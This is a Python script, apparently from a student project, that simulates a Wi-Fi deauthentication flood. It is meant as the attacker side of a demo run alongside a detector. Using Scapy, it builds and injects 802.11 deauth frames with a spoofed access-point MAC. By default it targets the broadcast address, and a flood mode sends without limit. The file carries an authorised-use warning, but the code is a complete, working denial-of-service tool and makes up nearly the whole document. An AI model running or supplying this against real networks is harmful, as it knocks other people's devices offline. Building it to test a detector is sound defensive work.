"""
=============================================================================
simulator.py — Deauth Flood Attack Simulator
=============================================================================
Simulates a deauthentication flood by crafting and injecting 802.11
deauth frames using Scapy.

PURPOSE:
  This script is the "attacker" side of the demo. Run it in one terminal
  while the detector runs in another. You'll see the detector fire in
  real time as this script sends frames.

IMPORTANT — LEGAL & ETHICAL USE:
  Only run this on networks and devices you own or have explicit permission
  to test. For the class demo, use your own phone hotspot as the target.
  This script is for educational purposes only.

REQUIREMENTS:
  - Monitor mode adapter (same one used by the detector, or a second one)
  - Run as root: sudo python3 simulator.py
  - The interface must be in monitor mode

USAGE:
  Run this on your LAPTOP (Kali VM), not the Raspberry Pi.
  The Pi passively detects the frames this script injects.

  sudo python3 simulator.py --iface wlan0mon --target FF:FF:FF:FF:FF:FF --count 50
  sudo python3 simulator.py --iface wlan0mon --target FF:FF:FF:FF:FF:FF --flood

  --target FF:FF:FF:FF:FF:FF sends deauth to ALL devices (broadcast)
  Replace with a specific MAC to target one device (your own phone only)
=============================================================================
"""

import argparse
import time
import random
from scapy.all import (
    RadioTap,       # Required wrapper for 802.11 injection
    Dot11,          # 802.11 base header
    Dot11Deauth,    # Deauthentication frame body
    sendp,          # Scapy function to send at layer 2 (raw frames)
)


def parse_args():
    parser = argparse.ArgumentParser(
        description="Deauth Flood Simulator — for testing the detector only"
    )
    parser.add_argument(
        "--iface",
        default="wlan0mon",
        help="Monitor mode interface to inject frames on (default: wlan0mon)"
    )
    parser.add_argument(
        "--target",
        default="FF:FF:FF:FF:FF:FF",
        help="Destination MAC address (default: FF:FF:FF:FF:FF:FF = broadcast, kicks all devices)"
    )
    parser.add_argument(
        "--bssid",
        default=None,
        help="BSSID (AP MAC) to spoof as sender. Random if not specified."
    )
    parser.add_argument(
        "--count",
        type=int,
        default=30,
        help="Number of deauth frames to send (default: 30)"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.1,
        help="Seconds between frames (default: 0.1 = 10 frames/sec)"
    )
    parser.add_argument(
        "--flood",
        action="store_true",
        help="Send frames as fast as possible (ignores --interval)"
    )
    parser.add_argument(
        "--reason",
        type=int,
        default=1,
        help="Deauth reason code to include in frames (default: 1 = Unspecified)"
    )
    return parser.parse_args()


def random_mac():
    """
    Generate a random MAC address to use as the spoofed sender.

    In a real attack, the attacker spoofs the AP's MAC address so that
    the victim client thinks the legitimate AP is sending the deauth.
    Here we use a random MAC for simulation purposes.
    """
    # Generate 6 random bytes, format as colon-separated hex
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))


def build_deauth_frame(src_mac, dst_mac, bssid, reason_code):
    """
    Construct a single 802.11 deauthentication frame using Scapy layers.

    Frame structure (bottom to top):
      RadioTap    — Required for frame injection; contains PHY metadata
      Dot11       — 802.11 MAC header with addresses and frame type info
      Dot11Deauth — Deauth-specific payload (just a 2-byte reason code)

    Dot11 address fields:
      addr1 = Destination (who we're kicking off)
      addr2 = Source / Transmitter (we're spoofing this as the AP)
      addr3 = BSSID (the access point's MAC)

    Args:
        src_mac     : MAC address to spoof as the sender (usually the AP)
        dst_mac     : Target client MAC (or FF:FF:FF:FF:FF:FF for broadcast)
        bssid       : BSSID of the network being spoofed
        reason_code : 802.11 deauth reason code (1 = Unspecified)

    Returns:
        A Scapy packet ready to be injected.
    """
    frame = (
        RadioTap() /                      # PHY layer wrapper (required for injection)
        Dot11(
            type=0,                       # Type 0 = Management frame
            subtype=12,                   # Subtype 12 = Deauthentication
            addr1=dst_mac,               # Destination: the client we're kicking
            addr2=src_mac,               # Source: spoofed as the AP
            addr3=bssid,                 # BSSID: the access point
        ) /
        Dot11Deauth(reason=reason_code)  # Reason code payload
    )
    return frame


def run_simulation(args):
    """
    Main simulation loop — builds and sends deauth frames.

    Args:
        args: Parsed argparse namespace with all configuration.
    """
    # Use provided BSSID or generate a random one to spoof
    bssid = args.bssid if args.bssid else random_mac()
    src_mac = bssid  # In a real attack, the source is spoofed as the AP

    print("=" * 60)
    print("  DEAUTH FLOOD SIMULATOR")
    print("=" * 60)
    print(f"  Interface   : {args.iface}")
    print(f"  Spoofed AP  : {src_mac}")
    print(f"  Target MAC  : {args.target}")
    print(f"  Reason code : {args.reason}")
    print(f"  Frame count : {'Unlimited (flood mode)' if args.flood else args.count}")
    print(f"  Interval    : {'As fast as possible' if args.flood else f'{args.interval}s'}")
    print("=" * 60)
    print("\n  Sending frames... (Ctrl+C to stop)\n")

    # Build the frame once and reuse it — building inside the loop wastes CPU
    frame = build_deauth_frame(src_mac, args.target, bssid, args.reason)

    sent = 0
    try:
        while args.flood or sent < args.count:
            # sendp() sends at layer 2 (raw Ethernet/Wi-Fi)
            # verbose=0 suppresses Scapy's per-packet output
            sendp(frame, iface=args.iface, verbose=0)
            sent += 1

            print(f"  [SENT] Frame #{sent} → {args.target} | Reason: {args.reason}")

            if not args.flood:
                time.sleep(args.interval)

    except KeyboardInterrupt:
        pass

    print(f"\n  Done. Sent {sent} deauth frames.")


if __name__ == "__main__":
    args = parse_args()
    run_simulation(args)
